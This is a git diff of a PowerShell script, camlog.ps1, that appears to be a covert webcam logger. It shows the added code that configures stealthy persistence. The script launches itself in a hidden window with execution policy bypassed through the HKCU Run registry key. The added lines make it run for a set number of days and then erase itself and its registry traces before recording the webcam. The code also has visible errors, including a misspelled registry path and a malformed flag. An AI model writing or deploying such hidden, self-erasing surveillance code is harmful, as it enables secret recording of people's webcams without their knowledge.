@@ -59,12 +59,35 @@ if(-not (Test-Path -Path 'ffmpeg/ffmpeg.exe' -PathType Leaf)){
     Remove-Item "7z.exe" -Force;
 }
 
-
 if(($Persistent -eq $true)){
     $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Anontoken=' + $Anontoken + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog' -Value $autostart;
 }elseif(Test-Path -Path "$env:temp\camlog.ps1" -PathType Leaf){
     Remove-Item "$env:temp\camlog.ps1" -Force;
+}
+
+if($DaysRun -eq -1 -or $DaysRun -gt 0){
+    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog'){ return };
+
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Anontoken=' + $Anontoken + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog' -Value $autostart;
+
+    if($DaysRun -eq -1){ return };
+    if(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\camlog' -Name 'date'){ return };
+
+    $date = (Get-Date).AddDays($daysRun);
+    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\camlog' -Name 'date' -Value $date;
+}
+
+if($DaysRun -gt 0){
+    $date = Get-Date;
+    $target = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\camlog' -Name 'date';
+
+    if($date -lt $target){ return }
+
+    Remove-Item "$env:temp\camlog.ps1" -Force;
+    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\Uinstall\camlog' -Force
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' - Force
 }
 
 Start-WebcamLogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
